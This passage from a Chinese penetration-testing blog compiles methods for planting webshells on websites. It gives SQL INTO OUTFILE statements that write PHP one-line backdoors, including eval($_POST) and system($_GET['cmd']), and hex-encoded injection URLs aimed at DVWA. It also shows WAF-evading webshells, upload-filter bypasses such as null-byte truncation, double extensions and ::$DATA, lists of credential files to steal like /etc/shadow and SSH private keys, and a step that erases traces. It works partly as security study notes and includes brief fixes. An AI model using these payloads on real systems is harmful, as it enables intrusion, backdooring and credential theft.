<p>往配置文件写入木马就可以了</p>
<p>不太清楚这个插废是啥情况，没遇到过，根据不同情况，编写不同代码，需要一定能力噢</p>
<h3 id="9、通过编辑模块拿WebShell"><a href="#9、通过编辑模块拿WebShell" class="headerlink" title="9、通过编辑模块拿WebShell"></a><a href="https://www.jianshu.com/writer">9、通过编辑模块拿WebShell</a></h3><p>1）通过对网站的<strong>模块</strong>进行编辑写入一句话，然后生成脚本文件拿WebShell</p>
<p>2）通过将木马添加到压缩文件，把名字改为<strong>网站模板类型</strong>，上传到网站服务器，拿WebShell</p>
<h3 id="10、修改脚本直接拿WebShell"><a href="#10、修改脚本直接拿WebShell" class="headerlink" title="10、修改脚本直接拿WebShell"></a><a href="https://www.jianshu.com/writer">10、修改脚本直接拿WebShell</a></h3><p>有的网站可以修改添加脚本文件，可以直接拿WebShell</p>
<h3 id="11、SQL命令获取"><a href="#11、SQL命令获取" class="headerlink" title="11、SQL命令获取"></a><a href="https://www.jianshu.com/writer">11、SQL命令获取</a></h3><p>这个算今天印象最深刻的了</p>
<p>可以通过phpmyadmin 登录数据库使用数据库命令来写如一句话拿WebShell</p>
<p><strong>注：这个前提条件是需要有一定的数据库权限</strong></p>
<p>大致步骤：</p>
<p>创建表</p>
<p>将一句话写入刚创建的表中</p>
<p>查询一句话所在表到文件，成功将一句话写入文件</p>
<p>具体操作</p>
<p><strong>第一种</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 CREATE TABLE &#96;mysql&#96;.&#96;best&#96; (&#96;best1&#96; TEXT NOT NULL );</span><br><span class="line"></span><br><span class="line">2 INSERT INTO &#96;mysql&#96;.&#96;best&#96; (&#96;best1&#96; ) VALUES (&#39;&#39;);</span><br><span class="line"></span><br><span class="line">3 SELECT &#96;best1&#96; FROM &#96;best&#96; INTO OUTFILE &#39;d:&#x2F;wamp&#x2F;www&#x2F;best.php&#39;;</span><br><span class="line"></span><br><span class="line">4 DROP TABLE IF EXISTS &#96;best&#96;;</span><br></pre></td></tr></table></figure>

<p>将一句话木马插入到mysql库best表best1字段</p>
<p>查询这个字段导出到网站的文件中</p>
<p>把痕迹清除</p>
<p><strong>第二种方法</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 Create TABLE moon(best text NOT NULL);</span><br><span class="line"></span><br><span class="line">2 Insert INTO moon(best)VALUES(&#39;&#39;);</span><br><span class="line"></span><br><span class="line">3 selectbest from moon into outfile&#39;d:&#x2F;wamp&#x2F;www&#x2F;best2.php&#39;;</span><br><span class="line"></span><br><span class="line">4、 Drop TABLE IF EXISTS moon;</span><br></pre></td></tr></table></figure>

<p><strong>第三种方法：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、select&#39;&#39;INTO OUTFILE&#39;d:&#x2F;wamp&#x2F;www&#x2F;best3.php&#39;</span><br></pre></td></tr></table></figure>

<p><strong>优先推荐不但简单明了，而且避免了误删别人的数据！</strong></p>
<p><strong>第四种方法</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 select&#39;\&#39;;system($_GET[\&#39;cmd\&#39;]); echo \&#39;\&#39;; </span><br><span class="line"></span><br><span class="line">2 ?&gt;&#39;INTO OUTFILE&#39;d:&#x2F;wamp&#x2F;www&#x2F;best4.php&#39;</span><br></pre></td></tr></table></figure>

<h3 id="12、上传特殊木马拿WebShell"><a href="#12、上传特殊木马拿WebShell" class="headerlink" title="12、上传特殊木马拿WebShell"></a><a href="https://www.jianshu.com/writer">12、上传特殊木马拿WebShell</a></h3><p>一些网站安装了WAF 安全狗、360，我们可以通过上传一些免杀马，变形木马来进行突破封杀<br>例如：<br>“%&gt;&lt;%eval request(“Skull.”)%&gt;&lt;%’”</p>
<h3 id="13、文件包含拿WebShell"><a href="#13、文件包含拿WebShell" class="headerlink" title="13、文件包含拿WebShell"></a><a href="https://www.jianshu.com/writer">13、文件包含拿WebShell</a></h3><p><strong>先将WebShell 改为txt格式文件上传，然后上传一个脚本文件包含该txt格式文件，可绕过WAF拿WebShell</strong></p>
<p>这种情况一般是，我们已经通过菜刀拿下了权限了，假设菜刀一句话木马可以过安全狗，但大马却怎么都没有上传成功，绕过安全狗</p>
<p>解决<strong>发现大马上传不了，被防火墙或者安全狗拦截时，可以考虑使用包含文件</strong></p>
<p><strong>思路</strong></p>
<p>1）先上传一个含有包含代码（如）却没有攻击代码的文件，不会被狗拦</p>
<p>2）再将大马改成jpg图片文件上传，也不会被狗拦</p>
<p>3）访问第一次上传的包含函数的文件，会发现执行了木马</p>
<p>4）这里是因为包含函数包含的文件会被当成脚本文件，直接将文件内容插入到这个文件中</p>
<h1 id="非管理权限（不登录后台）"><a href="#非管理权限（不登录后台）" class="headerlink" title="非管理权限（不登录后台）"></a>非管理权限（不登录后台）</h1><h2 id="1、SQL注入漏洞"><a href="#1、SQL注入漏洞" class="headerlink" title="1、SQL注入漏洞"></a><a href="https://www.jianshu.com/writer">1、SQL注入漏洞</a></h2><p>有高权限 有绝对路径可以直接写</p>
<p>前提条件，具有足够权限，对写入木马的文件夹有写入权限，知道网站绝对路径</p>
<blockquote>
<p>1.对于MsSQL 注入漏洞网站可以通过log 备份、差异备份拿WebShell</p>
<p>2.对于MySQL 注入漏洞的网站可以通过into outfile 函数(写入函数)将一句话木马写入，拿WebShell。要有file_priv权限</p>
<p>\2. 知道文件绝对路径</p>
<p>\3. 能使用union</p>
<p>\4. 对web目录有读权限</p>
<p>注：若过滤了单引号，则可以将函数中的字符进行hex编码还有一个是into file 函数（读取函数）# into outfile 函数类似</p>
</blockquote>
<p>之后3.利用phpmyadmin 将木马导出，拿WebShell</p>
<p>4.利用连接外连的数据库拿WebShell</p>
<h2 id="2、修改网站上传类型配置来拿WebShell"><a href="#2、修改网站上传类型配置来拿WebShell" class="headerlink" title="2、修改网站上传类型配置来拿WebShell"></a><a href="https://www.jianshu.com/writer">2、修改网站上传类型配置来拿WebShell</a></h2><p>某些网站，在网站上传类型中限制了上传脚本类型文件，我们可以去添加上传文件类型如添加asp | php | jsp | aspx | asa 后缀名来拿WebShell</p>
<h2 id="3、xss和sql注入联合利用"><a href="#3、xss和sql注入联合利用" class="headerlink" title="3、xss和sql注入联合利用"></a><a href="https://www.jianshu.com/writer">3、xss和sql注入联合利用</a></h2><p>有些输入框对一些符号过滤不严密（如&lt;&gt;，所以一般存在xss的地方就可以这么利用）我们可以在这里输入一句话<?php @eval($_POST['CE']);?>之后再用数据库注入，查询到文件into file成功插入一句话木马</p>
<h2 id="4、IIS写权限拿WebShell"><a href="#4、IIS写权限拿WebShell" class="headerlink" title="4、IIS写权限拿WebShell"></a><a href="https://www.jianshu.com/writer">4、IIS写权限拿WebShell</a></h2><p>有些网站的管理员在配置网站权限的时候疏忽，导致我们有写权限，这种漏洞需要用工具来利用，在这里就不说了，只是提一下。而且已经很少见了，有专门的利用工具（桂林老兵），原理是通过找到有IIS 写入权限的网站（开启WebDeV），PUT进去一个.txt 格式的文件，目录必须有刻写的权限，如 image 文件夹，然后通过move 方法，把txt 格式的木马用move 成脚本格式。</p>
<h2 id="5、远程命令执行拿WebShell"><a href="#5、远程命令执行拿WebShell" class="headerlink" title="5、远程命令执行拿WebShell"></a><a href="https://www.jianshu.com/writer">5、远程命令执行拿WebShell</a></h2><p>在有php代码执行漏洞</p>
<p>例如一些框架漏洞的时候</p>
<p>可以通过执行一些系统命令进行拿WebShell</p>
<p>执行命令行命令“写入内容到文件”echo ?php “@eval($_POST[‘CE’]);?&gt;” &gt; x.php 会自动将创建木马文件并将一句话木马写入其中，使用菜刀连接即可。</p>
<h2 id="6、头像上传拿WebShell"><a href="#6、头像上传拿WebShell" class="headerlink" title="6、头像上传拿WebShell"></a><a href="https://www.jianshu.com/writer">6、头像上传拿WebShell</a></h2><p>大概思路：</p>
<p>1、将大马放在文件夹中</p>
<p>2、将文件夹压缩成压缩文件（zip）</p>
<p>3、正常上传一个头像并且抓包</p>
<p>4、将数据包中图片头像的内容部分删掉</p>
<p>5、重新写入文件内容，将压缩文件写入到原本图片的位置</p>
<p>上传</p>
<p>之后返回包中会告诉我们绝对路径</p>
<h2 id="其他拿webshell方法"><a href="#其他拿webshell方法" class="headerlink" title="其他拿webshell方法"></a><a href="https://www.jianshu.com/writer">其他拿webshell方法</a></h2><p>1、PhpMyadmin获取Webshell</p>
<p>2、Tomcat获取Webshell</p>
<p>3、Weblogic获取Webshell</p>
<p>4、JBoss获取Webshell</p>
<p>5.更新页面拿webshell</p>
<p>在网站模板中的404页面中插入一句话木马，之后找到这个页面的绝对路径，访问之即可拿Shell</p>
<p>6.上传插件拿webshell</p>
<p>将木马放入zip压缩文件中，最好是网站插件的压缩文件，之后再后台安装插件，选中含有木马的压缩文件，会自动将插件连通木马安装在网站目录下，接下来我们只需要寻找到木马的绝对路径即可</p>
<p>今天一天查了好多资料，这篇文章借鉴了以下的文章，有的年代久远有的刚更新不久，与其说借鉴，倒不如说是对这些文章的一个总结抄录，在这里由衷感谢各位安全大佬的无私分享！</p>
<p>获取webshell的一些总结 <a href="https://www.jianshu.com/p/4d37c160d009">https://www.jianshu.com/p/4d37c160d009</a></p>
<p>拿WebShell 方法总结 原文链接：<a href="https://links.jianshu.com/go?to=https://blog.csdn.net/God_XiangYu/article/details/99644596">https://blog.csdn.net/God_XiangYu/article/details/99644596</a></p>
<p><a href="https://links.jianshu.com/go?to=http://gstarwd.iteye.com/blog/542376">http://gstarwd.iteye.com/blog/542376</a> dedecms获取Webshell总结</p>
<p><a href="https://links.jianshu.com/go?to=http://www.2cto.com/Article/201209/156909.html">http://www.2cto.com/Article/201209/156909.html</a> 浅谈MySQL导出一句话木马拿WebShell的方法</p>
<h1 id="对服务器文件进行读写操作获取webshell"><a href="#对服务器文件进行读写操作获取webshell" class="headerlink" title="对服务器文件进行读写操作获取webshell"></a>对服务器文件进行读写操作获取webshell</h1><h2 id="使用into-outfile需要有以下条件："><a href="#使用into-outfile需要有以下条件：" class="headerlink" title="使用into outfile需要有以下条件："></a>使用into outfile需要有以下条件：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、需要知道远程目录</span><br><span class="line">2、需要远程目录有写权限</span><br><span class="line">3、需要数据库开启secure_file_priv进行读写操作</span><br></pre></td></tr></table></figure>

<p>数据库开启secure_file_priv<br>into outfile 可以将select的结果写入到指定目录的txt中，但需要数据库开启secure_file_priv，怎么开启secure_file_priv。<br>在mysql安装目录的my.ini文件中的[mysqld]添加secure_file_priv = ‘ ‘；然后以管理员身份运行cmd，进入mysql/bin停止mysql服务net stop mysql，重新启动mysql服务net start mysql，登入mysql mysql -u root -p enter password: password，执行命令show variables like ‘%secure%’;查看secure_file_priv的值（这里已经将secure_file_priv的值设为空，但正常显示为NULL和文件路径），显示以下界面说明可以对服务器进行读写操作。</p>
<p><img src="/image/webshell/3.jpg"></p>
<p><a href="http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%201,load_file">http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%201,load_file</a>(‘c</p>
<p>如果出现以下情况:<br>Query Errot:SELECT CID,TITLE FROM CMS_CONTENTINDEX WHERE TID=25950\’AND 1=2 UNION SELECT LOAD_FILE(’C:\BOOT.INI\’),2<br>显然，在“php.ini”配置文件中magic_quotes_gpc为on或在接受参数的时候用了addslashes()涵数，单引号就会被自动转义成’，因此函数未能正确执行功能.要绕开此过滤，可将c:\boot.ini转换成十六进制，转换后为:0x633A5C5C626F6F742E696E69.再提交如下链接。<br><a href="https://links.jianshu.com/go?to=http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%2527%2520union%2520select%25201,load_file(0x633A5C5C626F6F742E696E69)+--+&Submit=Submit">http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%201,load_file(0x633A5C5C626F6F742E696E69)+–+&amp;Submit=Submit</a><br>或<a href="https://links.jianshu.com/go?to=http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1">http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1</a> and 1=2 union select 1,load_file(0x633A5C5C626F6F742E696E69)+–+&amp;Submit=Submit</p>
<p>如果想对服务器进行写操作，直接用下用这条语句进行操作：<br><a href="https://links.jianshu.com/go?to=http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%2527%2520union%2520select%2520%27568311803%27,2">http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%20’568311803’,2</a> into outfile ‘c:/muma.txt’+–+&amp;Submit=Submit<br>写个一句话试试：<br><a href="https://links.jianshu.com/go?to=http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%2527%2520union%2520select%25200x3C3F70687020406576616C28245F504F53545B2763686F70706572275D293B3F3E,2">http://192.168.1.55:8080/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%200x3C3F70687020406576616C28245F504F53545B2763686F70706572275D293B3F3E,2</a> into outfile ‘c:/muma.txt’+–+&amp;Submit=Submit<br>为什么要把一句话木马转化为十六进制，因为一句话木马里面也有单引号，再用单引号引起来会容易造成混淆。所以得出结论：如果用编码就不要用单引号，用单引号就不要用编码。</p>
<p><img src="/image/webshell/4.jpg"></p>
<h2 id="获取web路径方法"><a href="#获取web路径方法" class="headerlink" title="获取web路径方法"></a>获取web路径方法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%27%20union%20select%201,load_file(0x433A5C5C57494E444F57535C5C73797374656D33325C5C696E65747372765C5C4D657461426173652E786D6C)+--+&amp;Submit&#x3D;Submit  &#x2F;&#x2F;路径记得转化为十六进制</span><br></pre></td></tr></table></figure>

<p>常见WINDOWS下配置文件:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c:&#x2F;windows&#x2F;php.ini &#x2F;&#x2F;php配置信息</span><br><span class="line">c:&#x2F;windows&#x2F;my.ini &#x2F;&#x2F;MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</span><br><span class="line">c:\mysql\data\mysql\user.MYD &#x2F;&#x2F;存储了mysql.user表中的数据库连接密码</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置</span><br><span class="line">d:\APACHE\Apache2\conf\httpd.conf</span><br><span class="line">c:\windows\repair\sam &#x2F;&#x2F;存储了WINDOWS系统初次安装的密码</span><br></pre></td></tr></table></figure>

<p>LUNIX/UNIX 下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;apache2缺省配置文件</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhosts.conf &#x2F;&#x2F;虚拟网站设置</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关设置</span><br><span class="line">&#x2F;etc&#x2F;sysconfig&#x2F;iptables &#x2F;&#x2F;从中得到防火墙规则策略</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; apache配置文件</span><br><span class="line">&#x2F;etc&#x2F;rsyncd.conf &#x2F;&#x2F;同步程序配置文件</span><br><span class="line">&#x2F;etc&#x2F;my.cnf &#x2F;&#x2F;mysql的配置文件</span><br><span class="line">&#x2F;etc&#x2F;redhat-release &#x2F;&#x2F;系统版本</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;resin-3.0.22&#x2F;conf&#x2F;resin.conf 针对3.0.22的RESIN配置文件查看</span><br></pre></td></tr></table></figure>

<h2 id="服务器读取文件"><a href="#服务器读取文件" class="headerlink" title="服务器读取文件"></a>服务器读取文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union%20select%201,load_file(&#39;c:\\boot.ini&#39;)+--+&amp;Submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p>写webshell获取权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select &quot;&lt;?php @eval($_POST[&#39;123&#39;]);?&gt;&quot;,2 into outfile &quot;C:\\phpStudy\\WWW\\123.php&quot;+--+&amp;Submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<h2 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h2><p>利用sql注入写入webshell<br>假设我们通过phpinfo文件知道了网站的物理路径，接下来我们通过使用union select语句来写入webshell.写入需要你有写入权限等。<br>‘ union select 1,’‘ INTO OUTFILE ‘/var/www/dvwa/cmd.php’ +–+   //这种反斜找扛/本地没测试，大家测试一下，推见大家用两个反\方法，例如:<br><a href="https://links.jianshu.com/go?to=http://192.168.0.105:8080/dvwa/vulnerabilities/sqli/?id=1%27">http://192.168.0.105:8080/dvwa/vulnerabilities/sqli/?id=1’</a> union select “<?php @eval($_POST['chopper']);?>“,2 into outfile “c:\php\htdocs\dvwa\123.php”+–+&amp;Submit=Submit</p>
<p><img src="/image/webshell/5.jpg"></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>越权、逻辑漏洞</title>
    <url>/2019/12/20/%E8%B6%8A%E6%9D%83%E3%80%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h1><p><img src="/image/%E8%84%91%E5%9B%BE/%E8%B6%8A%E6%9D%83%E3%80%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E.png"></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传、下载</title>
    <url>/2019/10/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%81%E4%B8%8B%E8%BD%BD/</url>
    <content><![CDATA[<h2 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h2><p><img src="/image/%E8%84%91%E5%9B%BE/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%81%E4%B8%8B%E8%BD%BD.png"></p>
<h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><h3 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h3><p>  一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。</p>
<h3 id="二、利用方式"><a href="#二、利用方式" class="headerlink" title="二、利用方式"></a>二、利用方式</h3><h4 id="一般链接形式"><a href="#一般链接形式" class="headerlink" title="一般链接形式:"></a>一般链接形式:</h4><p>download.php?path=<br>down.php?file=<br>data.php?file=</p>
<h4 id="或者包含参数"><a href="#或者包含参数" class="headerlink" title="或者包含参数:"></a>或者包含参数:</h4><p>&amp;Src=<br>&amp;Inputfile=<br>&amp;Filepath=<br>&amp;Path=<br>&amp;Data=</p>
<h3 id="三、利用思路"><a href="#三、利用思路" class="headerlink" title="三、利用思路:"></a>三、利用思路:</h3><p>(1)下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置</p>
<p>(2)下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。</p>
<p>(3)下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。<br>      尝试读取/root/.bash_history看自己是否具有root权限。如果没有的话。我们只能按部就班的利用../来回跳转读取一些.ssh下的配置信息文件，读取mysql下的.bash_history文件。来查看是否记录了一些可以利用的相关信息。然后逐个下载我们需要审计的代码文件，但是下载的时候变得很繁琐，我们只能尝试去猜解目录，然后下载一些中间件的记录日志进行分析。</p>
<h5 id="如果我们遇到的是java-oracle环境"><a href="#如果我们遇到的是java-oracle环境" class="headerlink" title="如果我们遇到的是java+oracle环境"></a>如果我们遇到的是java+oracle环境</h5><p>  可以先下载/WEB-INF/classes/applicationContext.xml 文件，这里面记载的是web服务器的相应配置，然后下载/WEB-INF/classes/xxx/xxx/ccc.class对文件进行反编译，然后搜索文件中的upload关键字看是否存在一些api接口，如果存在的话我们可以本地构造上传页面用api接口将我们的文件传输进服务器</p>
<h5 id="如果具有root权限"><a href="#如果具有root权限" class="headerlink" title="如果具有root权限"></a>如果具有root权限</h5><p>  在linux中有这样一个命令 locate 是用来查找文件或目录的，它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db。这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次。当我们不知道路径是什么的情况下，这个可以说是一个核武器了，我们利用任意文件下载漏洞mlocate.db文件下载下来，利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息。</p>
<p>locate 读取方法: locate mlocate.db admin    //可以将mlocate.db中包含admin文件名的内容全部输出来</p>
<p>（4）常见利用文件<br>/root/.ssh/authorized_keys<br>/root/.ssh/id_rsa<br>/root/.ssh/id_ras.keystore<br>/root/.ssh/known_hosts //记录每个访问计算机用户的公钥<br>/etc/passwd<br>/etc/shadow<br>/etc/my.cnf //mysql配置文件<br>/etc/httpd/conf/httpd.conf //apache配置文件<br>/root/.bash_history //用户历史命令记录文件<br>/root/.mysql_history //mysql历史命令记录文件<br>/proc/mounts //记录系统挂载设备<br>/porc/config.gz //内核配置文件<br>/var/lib/mlocate/mlocate.db //全文件路径<br>/porc/self/cmdline //当前进程的cmdline参数</p>
<h3 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h3><p>（1）过滤”.”，使用户在url中不能回溯上级目录</p>
<p>（2）正则严格判断用户输入参数的格式</p>
<p>（3）php.ini配置open_basedir限定文件访问范围</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p><img src="/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/1.jpg"></p>
<h3 id="一、客户端检测绕过-javascript-检测"><a href="#一、客户端检测绕过-javascript-检测" class="headerlink" title="一、客户端检测绕过(javascript 检测)"></a>一、客户端检测绕过(javascript 检测)</h3><p>​      首先观察到提示只允许上传图片文件，那么前端的查看代码，当页面发生改变时，会调用这个checkFileExt函数来检查上传的是不是图片，我们只需要在前端将checkFileExt函数删除，就能上传一个一个非图片文件。</p>
<p><strong>文件上传客户端：</strong></p>
<p>将checkFileExt(this.value)函数删除便可上传任意文件</p>
<p>或者通过burp抓包将之前改为符合类型的文件在改回来</p>
<h3 id="二、服务端验证绕过-MIME-类型检测"><a href="#二、服务端验证绕过-MIME-类型检测" class="headerlink" title="二、服务端验证绕过(MIME 类型检测)"></a>二、服务端验证绕过(MIME 类型检测)</h3><p>​      MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p>
<p>​      每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。</p>
<p><strong>常见的MIME类型(通用型)：</strong></p>
<ul>
<li>超文本标记语言文本 .html text/html</li>
<li>xml文档 .xml text/xml</li>
<li>XHTML文档 .xhtml application/xhtml+xml</li>
<li>普通文本 .txt text/plain</li>
<li>RTF文本 .rtf application/rtf</li>
<li>PDF文档 .pdf application/pdf</li>
<li>Microsoft Word文件 .word application/msword</li>
<li>PNG图像 .png image/png</li>
<li>GIF图形 .gif image/gif</li>
<li>JPEG图形 .jpeg,.jpg image/jpeg</li>
<li>au声音文件 .au audio/basic</li>
<li>MIDI音乐文件 mid,.midi audio/midi,audio/x-midi</li>
<li>RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio</li>
<li>MPEG文件 .mpg,.mpeg video/mpeg</li>
<li>AVI文件 .avi video/x-msvideo</li>
<li>GZIP文件 .gz application/x-gzip</li>
<li>TAR文件 .tar application/x-tar</li>
<li>任意的二进制数据 application/octet-stream</li>
</ul>
<p><strong>通过使用 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。</strong></p>
<p>第一个参数是表单的 input name，第二个下标可以是 “name”, “type”, “size”, “tmp_name” 或 “error”。就像这样：</p>
<p><code>$_FILES[&quot;file&quot;][&quot;name&quot;] </code> 被上传文件的名称</p>
<p><code>$_FILES[&quot;file&quot;][&quot;type&quot;]</code> 被上传文件的类型</p>
<p><code>$_FILES[&quot;file&quot;][&quot;size&quot;]</code> 被上传文件的大小，以字节计</p>
<p><code>$_FILES[&quot;file&quot;][&quot;tmp_name&quot;]</code> 存储在服务器的文件的临时副本的名称</p>
<p><code>$_FILES[&quot;file&quot;][&quot;error&quot;]</code> 由文件上传导致的错误代码</p>
<p>详细可参考：<a href="http://www.w3school.com.cn/php/php_file_upload.asp">http://www.w3school.com.cn/php/php_file_upload.asp</a></p>
<p>​       分析代码逻辑：首先会获取到前端的提交请求，然后定义了一个数组（定义图片上传指定类型），然后通过upload_sick函数对上传的文件进行一定的检查。</p>
<p>分析upload_sick函数（定义在uploadfunction.php文件里面）存在漏洞的的原因是因为 $ _FILES() 这个全局的方法是通过浏览器http头去获取的content-type，content-type是前端用户可以控制的。容易被绕过。</p>
<p>​     上传一张正常的符合标准的图片，对其content-type进行抓包操作。可见正常上传符合要求的图片中数据包中content-type为image/png对比符合条件，而php文件则不符合条件返回文件类型错误。</p>
<h3 id="三、代码注入绕过–getimagesize"><a href="#三、代码注入绕过–getimagesize" class="headerlink" title="三、代码注入绕过–getimagesize()"></a>三、代码注入绕过–getimagesize()</h3><p>​    getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息，如果用这个涵数来获取类型，从而判断是否是图片的话，会存在问题。</p>
<p>语法格式：</p>
<p>  <code> array getimagesize ( string $filename [, array &amp;$imageinfo ] )</code></p>
<p>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</p>
<p><strong>文件包含漏洞之文件上传漏洞利用</strong></p>
<p>方法一：直接伪造头部GIF89A</p>
<p>方法二：CMD方法，copy /b test.png+1.php muma.png</p>
<p>方法三：直接使用工具增加备注写入一句话木马。</p>
<h3 id="四、路径-扩展名绕过"><a href="#四、路径-扩展名绕过" class="headerlink" title="四、路径/扩展名绕过"></a>四、路径/扩展名绕过</h3><p>1、白名单</p>
<p>0x00截断或test.asp%00.jpg</p>
<p>MIME绕过</p>
<p>2、黑名单</p>
<p>（1）文件名大小写绕过</p>
<p>（2）名单绕过</p>
<p>​     用黑名单里没有的名单进行攻击，比如黑名单里没有.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件之类</p>
<p>（3）特殊文件名或文件夹绕过(windows)</p>
<p>​      还有比如发送的http 包里把文件名改成test.asp. 或test.asp_(下划线为空格)，这种命名方式在windows 系统里是不被允许的，所以需要在burp 之类里进行修改，然后绕过验证后，会被windows 系统自动去掉后面的点和空格，但要注意Unix/Linux 系统没有这个特性。</p>
<p>（4）0x00截断%00和0x0a</p>
<p>name = getname(http request) //假如这时候获取到的文件名是test.asp .jpg(asp 后面为0x00)</p>
<p>type = gettype(name) //而在gettype()函数里处理方式是从后往前扫描扩展名，所以判断为jpg</p>
<p>if (type == jpg)</p>
<p>SaveFileToPath(UploadPath.name, name) //但在这里却是以0x00 作为文件名截断</p>
<p>​                                   //最后以test.asp 存入路径里</p>
<p>（5）把文件名改成test.asp. 或test.asp_(下划线为空格)，这种命名方式在windows 系统里是不被允许的，所以需要在burp 之类里进行修改，然后绕过验证后，会被windows 系统自动去掉后面的点和空格，但要注意Unix/Linux 系统没有这个特性。</p>
<p>（6）双后缀名绕过</p>
<p>（7）::$DATA绕过</p>
<p>​    是Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性 DATA 时，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:lake2.asp，请求 a.asp:lake2.asp::$DATA，则是请求a.asp中的流数据lake2.asp的流数据内容。</p>
<h3 id="五、中间件解析漏洞绕过"><a href="#五、中间件解析漏洞绕过" class="headerlink" title="五、中间件解析漏洞绕过"></a>五、中间件解析漏洞绕过</h3><h4 id="总结图-1"><a href="#总结图-1" class="headerlink" title="总结图"></a>总结图</h4><p><img src="/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/2.jpg"></p>
